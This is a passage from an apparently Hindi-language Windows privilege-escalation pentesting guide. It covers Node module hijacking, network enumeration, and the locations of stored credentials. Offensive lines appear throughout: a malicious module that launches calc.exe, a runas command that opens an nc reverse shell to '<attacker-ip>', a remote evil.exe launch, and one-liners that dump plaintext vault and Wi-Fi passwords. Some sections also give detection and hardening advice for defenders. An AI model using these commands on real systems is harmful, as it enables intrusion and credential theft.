- `Process Name` को target executable (`node.exe`, Electron app EXE, या wrapper process) पर फ़िल्टर करें
- `Path` को `node_modules` `contains` करने पर फ़िल्टर करें
- `NAME NOT FOUND` और `C:\node_modules` के अंतर्गत आखिरी सफल open पर ध्यान दें

Unpacked `.asar` files या application sources में code review के लिए उपयोगी patterns:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon या source review से **missing package name** पहचानें।
2. यदि root lookup directory पहले से मौजूद नहीं है, तो उसे बनाएँ:

```powershell
mkdir C:\node_modules
```

3. सटीक अपेक्षित नाम वाला module डालें:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. victim application को trigger करें। यदि application `require("foo")` करने की कोशिश करता है और वैध module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` लोड कर सकता है।

इस पैटर्न में आने वाले अनुपस्थित optional modules के वास्तविक उदाहरणों में `bluebird` और `utf-8-validate` शामिल हैं, लेकिन **technique** का दोबारा इस्तेमाल किया जा सकता है: किसी भी **missing bare import** को ढूँढ़ें जिसे कोई privileged Windows Node/Electron process resolve करेगा।

### Detection और hardening के सुझाव

- जब कोई user `C:\node_modules` बनाए या वहाँ नई `.js` files/packages लिखे, तो alert करें।
- `C:\node_modules\*` से पढ़ने वाली high-integrity processes की तलाश करें।
- Production में सभी runtime dependencies package करें और `optionalDependencies` के इस्तेमाल का audit करें।
- Third-party code में `try { require("...") } catch {}` जैसे silent patterns की समीक्षा करें।
- जब library इसका समर्थन करती हो, तो optional probes disable करें (उदाहरण के लिए, कुछ `ws` deployments `WS_NO_UTF_8_VALIDATE=1` के साथ legacy `utf-8-validate` probe से बच सकते हैं)।

## नेटवर्क

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें.

```
type C:\Windows\System32\drivers\etc\hosts
```

### नेटवर्क इंटरफ़ेस और DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### खुले पोर्ट

बाहरी ओर से **प्रतिबंधित सेवाओं** की जाँच करें

```bash
netstat -ano #Opened ports?
```

किसी local listener के लिए, उसके PID का मिलान process owner, executable path और उसे शुरू करने वाली किसी service या scheduled task से करें। Remote-control service से desktop user के रूप में access तभी मिल सकता है, जब उसके authentication और command controls इसकी अनुमति दें। Higher-privileged account के रूप में चलने वाला custom TCP application एक अलग review target है: listener और binary path केवल passive leads हैं, जबकि authenticated memory-corruption route के लिए उसी binary और उसके reachable input का विश्लेषण आवश्यक है। अगर कोई exposed port किसी system process का लगता है, तो backend service का निर्धारण करने से पहले उसकी तुलना [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) से करें; केवल forwarding rule से यह साबित नहीं होता कि destination reachable या vulnerable है।

### Routing Table

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Table

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall Rules

[**Firewall से संबंधित commands के लिए यह पेज देखें**](../basic-cmd-for-pentesters.md#firewall) **(rules की सूची देखें, rules बनाएँ, बंद करें, बंद करें...)**

[Network enumeration के लिए और commands यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है।

यदि आपको root user मिल जाता है, तो आप किसी भी port पर listen कर सकते हैं (पहली बार `nc.exe` का इस्तेमाल करके किसी port पर listen करने पर GUI के ज़रिए पूछा जाएगा कि क्या firewall में `nc` को अनुमति दी जानी चाहिए)।

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

आसानी से root के रूप में bash शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं।

आप `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में `WSL` filesystem देख सकते हैं।

WSL के अंदर Linux `root` होने से अपने आप Windows Administrator अधिकार नहीं मिलते। यदि वर्तमान Windows identity किसी distribution के filesystem को पढ़ सकती है, तो shell-history फ़ाइलें (जिसमें `/root/.bash_history` भी शामिल है) देखें कि कहीं उनमें credentials दर्ज करने वाले commands तो नहीं हैं; privilege escalation के लिए फिर भी किसी वैध higher-privilege account और अनुमत authentication path की आवश्यकता होती है। `LocalState\rootfs` layout पुराने WSL installations पर लागू होता है; WSL 2 में distribution आम तौर पर [`ext4.vhdx` virtual disk](https://learn.microsoft.com/en-us/windows/wsl/disk-space) में संग्रहीत होती है, इसलिए पहले वास्तविक distribution और storage path का पता लगाएँ। Automated enumeration के दौरान history की सामग्री प्रिंट करने से बचें।

## Windows Credentials

### Winlogon Credentials

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` और `DefaultDomainName` को credentials नहीं, account context मानें। गैर-खाली `DefaultPassword` या `AltDefaultPassword` मान plaintext registry finding है। अगर `AutoAdminLogon=1` है, लेकिन कोई plaintext password पढ़ा नहीं जा सकता, तो यह सिर्फ़ एक lead है: [Sysinternals Autologon password को LSA secret के रूप में स्टोर कर सकता है](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), और सामान्य registry reads से यह साबित नहीं होता कि वह secret मौजूद है या उसे retrieve किया जा सकता है। Credential exposure की रिपोर्ट करने से पहले access rights और वास्तविक logon configuration की समीक्षा करें।

### Credentials Manager / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> से\
Windows Vault, servers, websites और अन्य programs के लिए user credentials स्टोर करता है, जिनका उपयोग **Windows** **users को अपने-आप log in करने** के लिए कर सकता है। पहली नज़र में ऐसा लग सकता है कि users Facebook, Twitter या Gmail जैसी sites के credentials स्टोर कर सकते हैं और browsers उनसे अपने-आप log in कर सकते हैं, लेकिन ऐसा नहीं है।

Windows Vault ऐसे credentials स्टोर करता है जिनका उपयोग Windows users को अपने-आप log in करने के लिए कर सकता है। इसका अर्थ है कि कोई भी **Windows application जिसे किसी resource** (server या website) **को access करने के लिए credentials की ज़रूरत हो**, इस Credential Manager और Windows Vault का उपयोग कर सकती है और users द्वारा हर बार username और password दर्ज करने के बजाय दिए गए credentials इस्तेमाल कर सकती है।

जब तक applications Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए resource के credentials इस्तेमाल कर सकती हैं। इसलिए, अगर आपका application vault का उपयोग करना चाहता है, तो उसे किसी तरह **credential manager से communicate करके उस resource के credentials का अनुरोध** default storage vault से करना चाहिए।

Machine पर स्टोर किए गए credentials की सूची देखने के लिए `cmdkey` का उपयोग करें।

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

इसके बाद, सहेजे गए credentials का उपयोग करने के लिए `/savecred` विकल्प के साथ `runas` इस्तेमाल कर सकते हैं। निम्न उदाहरण SMB share के माध्यम से एक remote binary को कॉल करता है।

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

प्रदान किए गए क्रेडेंशियल्स के सेट के साथ `runas` का उपयोग करना।

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) का उपयोग किया जा सकता है।

### UWP PasswordVault / Credential Locker

आधुनिक Windows UWP applications, Microsoft Edge और आधुनिक system services, authentication tokens और plaintext passwords को Universal Windows Platform (UWP) `PasswordVault` के अंदर store करती हैं (इसे `vaultcmd` में `Web Credentials` के रूप में भी दिखाया जाता है)। यह storage space session-isolated होता है और इसे administrative या `SeDebugPrivilege` rights के बिना native तरीके से decrypt किया जा सकता है।

सभी stored usernames और plaintext passwords को तुरंत dump और decrypt करने के लिए, user's active session के अंदर यह PowerShell command execute करें:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** डेटा को symmetric encryption से एन्क्रिप्ट करने का एक तरीका प्रदान करता है। इसका उपयोग मुख्य रूप से Windows operating system में asymmetric private keys को symmetric encryption से एन्क्रिप्ट करने के लिए किया जाता है। इस encryption में entropy बढ़ाने के लिए user या system secret का महत्वपूर्ण योगदान होता है।

**DPAPI, user के login secrets से प्राप्त symmetric key के ज़रिए keys को एन्क्रिप्ट करने की सुविधा देता है**। System encryption के मामलों में, यह system के domain authentication secrets का उपयोग करता है।

DPAPI से एन्क्रिप्ट की गई user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` directory में संग्रहीत होती हैं, जहाँ `{SID}` user के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) को दर्शाता है। **DPAPI key, उसी file में user की private keys की सुरक्षा करने वाली master key के साथ रखी जाती है** और आमतौर पर इसमें 64 bytes का random data होता है। (ध्यान दें कि इस directory तक पहुँच प्रतिबंधित है, इसलिए CMD में `dir` command से इसकी सामग्री की सूची नहीं बनाई जा सकती, हालाँकि PowerShell के ज़रिए सूची बनाई जा सकती है।)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

आप इसे decrypt करने के लिए उचित arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**master password** द्वारा सुरक्षित **credentials files** आमतौर पर यहाँ स्थित होती हैं:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

आप decrypt करने के लिए उचित `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग कर सकते हैं।\
अगर आप root हैं, तो `sekurlsa::dpapi` module से **memory** से कई **DPAPI** **masterkeys** **extract** कर सकते हैं।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation tasks में encrypted credentials को सुविधाजनक तरीके से store करने के लिए किया जाता है। ये credentials **DPAPI** से सुरक्षित होते हैं, जिसका आम तौर पर मतलब है कि इन्हें केवल वही user उसी computer पर decrypt कर सकता है जिस पर ये बनाए गए थे।

Export किए गए credential का filename या `.xml` path कुछ भी हो सकता है। जब कोई script या file inventory उसकी ओर संकेत करे, तो `C:\Users` मान लेने के बजाय account की वास्तविक profile directory का पता लगाएँ: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)। पढ़ी जा सकने वाली file केवल एक सुराग है; [Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), और प्राप्त account के पास intended service के लिए अलग से valid rights होने चाहिए। नियमित enumeration के दौरान encrypted या plaintext values दिखाए बिना पहले paths और ACLs की जाँच करें।

किसी file से PS credentials को **decrypt** करने के लिए:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers` में पा सकते हैं।

### हाल ही में चलाए गए कमांड

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** के `dpapi::rdg` module का उपयोग उपयुक्त `/masterkey` के साथ **किसी भी .rdg file को decrypt करने** के लिए करें\
Mimikatz के `sekurlsa::dpapi` module से आप memory से **कई DPAPI masterkeys निकाल सकते हैं**

**mRemoteNG एक अलग connection store का उपयोग करता है।** `%APPDATA%\mRemoteNG` और user Documents में पढ़े जा सकने वाले XML का निरीक्षण करें, जिसमें `config.xml` जैसे सामान्य नामों वाली files भी शामिल हैं। XML file को credential lead मानने से पहले connection schema और encrypted `Password` attributes की पहचान करें। संग्रहीत value, DPAPI/RDCMan password नहीं है; उसे recover करना file की encryption settings और इस बात पर निर्भर करता है कि custom master password का उपयोग किया गया था या नहीं। व्यापक enumeration के दौरान encrypted values को print करने से बचें।

**Remote Desktop Plus profile exports** भी user directories या साझा administration folder में पढ़े जा सकते हैं। पुराने `profiles.xml` export में `ProfileName`, `Password` और `Secure` elements वाली `Data/Profile` entries होती हैं। गैर-खाली password element को credential lead मानें, लेकिन उसे print न करें और न ही plaintext मानें: [vendor का कहना है](https://www.donkz.nl/) कि profile protection को बनाने वाले account और computer से जोड़ा जा सकता है, या कम सख्त तरीके से configure किया जा सकता है। उस पर भरोसा करने से पहले file के source और recovery conditions की पुष्टि करें।

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का इस्तेमाल **passwords** और अन्य जानकारी **सहेजने** के लिए करते हैं, यह समझे बिना कि यह database file है। यह file `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर होती है और इसे खोजना व जाँचना हमेशा उपयोगी होता है।

लोग कभी-कभी sticky-note applications में passwords और अन्य जानकारी सहेजते हैं। Microsoft का packaged Sticky Notes app आम तौर पर notes को `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में सहेजता है; पुराने या अलग apps, LevelDB सहित, अन्य user-profile stores का उपयोग कर सकते हैं। SQLite file न मिलने को notes न होने का प्रमाण मानने से पहले installed app और storage format की पहचान करें।

यदि Sticky Notes SQLite write-ahead logging का उपयोग कर रहा है, तो केवल `plum.sqlite` की copy में हाल ही में committed notes छूट सकते हैं। Database की consistent copy के साथ संबंधित `plum.sqlite-wal` भी रखें, और उपलब्ध होने पर `plum.sqlite-shm` भी शामिल करें; shared-memory index को दोबारा बनाया जा सकता है, लेकिन WAL database की persistent state का हिस्सा है। [SQLite का WAL documentation](https://www.sqlite.org/wal.html) देखें। Account name या password वाला note केवल एक credential lead है: account, अनुमत access और password reuse की अलग-अलग पुष्टि करें। किसी encrypted password-manager record से higher-privilege login स्थापित करने से पहले उसकी वास्तविक decryption key और application-specific interpretation भी आवश्यक है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से passwords recover करने के लिए आपको Administrator होना और High Integrity level पर चलाना आवश्यक है।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
यदि यह file मौजूद है, तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recover** किया जा सके।

यह code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से लिया गया था:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं।\
Installers **SYSTEM privileges के साथ चलाए जाते हैं**, और कई **DLL Sideloading के प्रति vulnerable हैं (जानकारी** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)।**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## फ़ाइलें और Registry (Credentials)

### Support-tool registry credential artifacts

कुछ पुराने remote-support installations में fixed application registry keys के अंतर्गत password से जुड़े value names बने रहते हैं। उदाहरण के लिए, [vendor की registry-key व्याख्या](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) के अनुसार, TeamViewer के `SecurityPasswordAES` ने version 9 से पहले configured static session password की पहचान की थी। Value-name marker केवल जाँच का संकेत है: उस credential का आकलन करने से पहले installed version, पढ़े जा सकने वाले value data, format और मौजूदा authentication behavior की पुष्टि करें। Remote-support password से अधिक privileged Windows account तक पहुँचने के लिए, उस account के साथ password का वास्तव में reuse होना और उस account के लिए authorization भी आवश्यक है। सामान्य enumeration output में ciphertext और recovered passwords न दिखाएँ।

### Protected sheets वाली shared spreadsheets

यदि संदेह हो कि पढ़ी जा सकने वाली shared workbook में account data है, तो **file encryption** और worksheet protection या छिपे हुए columns में अंतर करें। [Microsoft के अनुसार](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), worksheet protection editing को नियंत्रित करता है और security feature नहीं है; इससे यह साबित नहीं होता कि workbook का content encrypted है। केवल authorized और relevant files की जाँच करें, और व्यापक enumeration के दौरान संभावित secrets प्रिंट न करें। पढ़ा जा सकने वाला `.xlsx` path, protected sheet या छिपा हुआ column अकेले यह साबित नहीं करता कि credentials मौजूद हैं या किसी account के पास अधिक privileges हैं; वास्तविक data और मौजूदा account rights की अलग-अलग पुष्टि करें।

### CI server में रखे गए change patches

Build पूरा होने के बाद भी CI server अपने data directory में submit किए गए source changes रख सकता है। [TeamCity के दस्तावेज़](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) में `system/changes` को remote-run changes के storage के रूप में बताया गया है; data directory configure किया जा सकता है और यह ज़रूरी नहीं कि `ProgramData` के अंतर्गत हो। पढ़ा जा सकने वाला patch, credential file, encryption key या दोनों का उपयोग करने वाली script के हटाए गए या जोड़े गए references सुरक्षित रख सकता है। उदाहरण के लिए, PowerShell के `ConvertTo-SecureString -Key` workflow के लिए AES key के साथ-साथ encrypted string भी चाहिए; [Microsoft के दस्तावेज़](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) के अनुसार, key अलग से दी जाती है। पहले केवल उपलब्ध patch names की जाँच करें, फिर authorization के अंतर्गत relevant content देखें; सामान्य enumeration output में secrets प्रिंट न करें। Patch path, encrypted value या key reference अकेले valid credential या higher-privilege access साबित नहीं करता। Data-directory ACLs सीमित रखें और build changes में secrets commit न करें।

### Custom local administrator password rotation

Homegrown password rotator, encrypted local administrator password को किसी local service में रख सकता है, जबकि उसके datastore credentials किसी पढ़ी जा सकने वाली `.env` file में या updater binary के पास रखे हों। Updater का scheduled task, account, configuration ACLs, listener और datastore permissions—इन सभी की एक साथ जाँच करें। केवल loopback पर उपलब्ध datastore भी ऐसे local user के लिए reachable होता है जिसके पास valid credentials हों, लेकिन authentication मात्र से relevant records पढ़ने की permission साबित नहीं होती। यदि encryption seed या key material ciphertext के पास उपलब्ध है, तो encryption पर भरोसा करने से पहले exact key derivation की जाँच करें। Exposed seed से Go के [`math/rand`](https://pkg.go.dev/math/rand) का उपयोग करके deterministically AES key derive करने वाला तरीका उस password की सुरक्षा के लिए अनुपयुक्त है; Go के दस्तावेज़ों में उस package को security-sensitive randomness के लिए अनुचित बताया गया है। किसी recovered password को escalation path मानने से पहले पुष्टि करें कि वह अभी भी valid है और local Administrators-group account का है। Scheduled task, `.env` path या encrypted blob अकेले इनमें से कोई भी शर्त साबित नहीं करता। सामान्य enumeration output में passwords और key material न दिखाएँ।

Managed local administrator passwords के लिए [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) का उपयोग करें। इसका directory या Entra-backed storage और access controls, custom local datastore से अलग हैं; इसी तरह, [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) तय करते हैं कि authenticated datastore user कोई specific index पढ़ सकता है या नहीं।

### Java server plugin archives और credential reuse

कुछ Java server plugins, server की `plugins` directory में JAR archives के रूप में वितरित किए जाते हैं। पढ़े जा सकने वाले custom plugin में embedded service credential वाली configuration या bytecode हो सकती है। Archive की जाँच केवल authorization होने पर करें और recovered secrets को सामान्य enumeration output से बाहर रखें। Plugin path अकेले यह साबित नहीं करता कि कोई secret मौजूद है, और recovered service password से higher privileges तभी मिलते हैं जब वह किसी अधिक privileged account के लिए भी valid हो। Relevant file ACLs जाँचें और reused credentials को अलग-अलग secrets से बदलें। Directory layout के लिए [PaperMC की plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) और archive contents के लिए [Oracle का JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) देखें।

### Openfire embedded database credentials

Embedded database का उपयोग करने वाला Openfire installation, `openfire.script` को `Openfire\embedded-db` के अंतर्गत रख सकता है। यदि मौजूदा account उसे पढ़ सकता है, तो `OFUSER` records और `passwordKey` property को साथ में देखें। Openfire के [user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) के अनुसार, passwords plain text में या उस property में रखी key से encrypted रूप में store किए जा सकते हैं। Recovered password escalation के लिए तभी मायने रखता है जब वह किसी अधिक privileged identity के लिए अभी भी valid हो; केवल file name से read access या credential reuse साबित नहीं होता। Path को inventory cue मानें और database content तथा credentials को सामान्य enumeration output से बाहर रखें।

अलग `Openfire\conf\openfire.xml` file, external database के इस्तेमाल के बावजूद, admin console के configured ports और bind interface का पता दे सकती है। Openfire आम तौर पर अपने admin console को loopback पर bind करता है; यदि listener चल रहा हो, तो local account फिर भी उस address तक पहुँच सकता है। Actual listener, authorized admin role, plugin-upload policy और Openfire service identity की एक साथ जाँच करें। Plugin install कर सकने वाला admin, plugin code को service के context में चला सकता है; यदि service LocalSystem के रूप में चलती है, तो यह context अत्यधिक privileged हो सकता है। Matching account password या पढ़ा जा सकने वाला configuration path अकेले admin-console access या code execution साबित नहीं करता। Vendor की [installation and plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) और [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) देखें।

### Forensic management server configuration

Velociraptor server configurations, जिनका नाम आम तौर पर `server.config.yaml` होता है, उनमें internal CA का `CA.private_key` हो सकता है। यदि कम privileged user उस key को पढ़ सकता है, तो वह API client certificate बना सकता है। इससे higher privileges मिलेंगे या नहीं, यह server के user roles, API reachability और server या target agent के execution identity पर निर्भर करता है। Client configuration में अलग material होता है; उसे ढूँढ़ लेने से server CA तक access साबित नहीं होता। कुछ deployments में CA private key offline रखी जाती है, इसलिए पढ़ी जा सकने वाली server configuration में signing key न भी हो सकती है।

Windows server पर, installation directory में **server** configuration और उसकी protected backup copies के ACL की जाँच करें। एक संभावित location `%ProgramFiles%\VelociraptorServer\server.config.yaml` है; यदि service का configured path अलग हो, तो वही उपयोग करें। पुष्टि करें कि मौजूदा identity file पढ़ सकती है और `CA.private_key` वास्तव में मौजूद है। Private key को logs या enumeration output में प्रिंट न करें। Vendor का `config api_client` workflow client certificate जारी करने के लिए CA key का उपयोग करता है, लेकिन इसके लिए प्रभावी server-side role भी चाहिए; ऐसा role बनाना या बदलना datastore write access या restart की माँग कर सकता है। इन writes की अनुमति न होने पर भी, पहले से मौजूद privileged server identity एक रास्ता दे सकती है। Execution rights वाली API queries संबंधित server या agent context में चलती हैं, जो अत्यधिक privileged हो सकता है।

Server configuration और backups को restrictive ACLs से सुरक्षित रखें, जहाँ संभव हो CA signing key को offline रखें, और API roles तथा listener access सीमित करें। [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) और [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/) देखें।

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY एक अलग session manager है। इसका native encrypted store `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` पर हो सकता है, जबकि exported session backup का नाम `sessions-backup.dat` हो सकता है और यह कहीं और stored हो सकता है। [SolarWinds की export guide](https://thwack.solarwinds.com/discussion/comment/115591) के अनुसार exports password-encrypted होते हैं और उनमें sessions, keys, scripts, tags और relationships हो सकते हैं; इसका [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) native store की पहचान करता है। पहले file permissions और paths जाँचें। इनमें से कोई भी file मिलने से उसका password पता नहीं चलता और न ही यह साबित होता है कि कोई saved credential अब भी valid है या उसके पास higher privileges हैं।

### PuTTY SSH होस्ट कीज़

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry में SSH keys

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर store किया जा सकता है, इसलिए जाँचें कि उसमें कुछ दिलचस्प है या नहीं:

```bash
